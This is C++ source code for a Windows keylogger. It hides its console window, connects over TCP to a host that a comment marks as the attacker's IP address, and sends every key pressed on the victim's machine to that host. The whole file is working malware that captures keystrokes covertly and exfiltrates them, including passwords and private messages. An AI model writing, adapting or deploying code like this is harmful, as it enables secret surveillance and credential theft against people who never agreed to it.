#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>


int main()
{
    // Hides the program window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char kbKey;
    WSADATA winSocket;
    SOCKET socType;
    SOCKADDR_IN addr;

    // Initialize winsock library usage for network connection
    WSAStartup(MAKEWORD(2, 0), &winSocket);
    // Set up a TCP socket
    socType = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2"); // Attacker IP Address
    addr.sin_family = AF_INET; // IPv4
    addr.sin_port = htons(5555); // Used Port

    // Connect to the target Host & Port
    connect(socType, (SOCKADDR *)&addr, sizeof(addr));

    //  Continously checks if a key in the range (0x8 to 0xFF) is pressed.
    while (true)
    {
        Sleep(10);
        // Checks for the Whole Key Bindings
        for (int kbKey = 0x8; kbKey < 0xFF; kbKey++)
        {
            // Checks is pressed state
            if (GetAsyncKeyState(kbKey) & 0x8000)
            {
                char buffer[2];
                buffer[0] = kbKey;
                // Sends the Hexa of the key back to the attacker machine
                send(socType, buffer, sizeof(buffer), 0);
            }
        }
    }

    // Close the SOCKET
    closesocket(socType);
    // Clean up library components
    WSACleanup();
}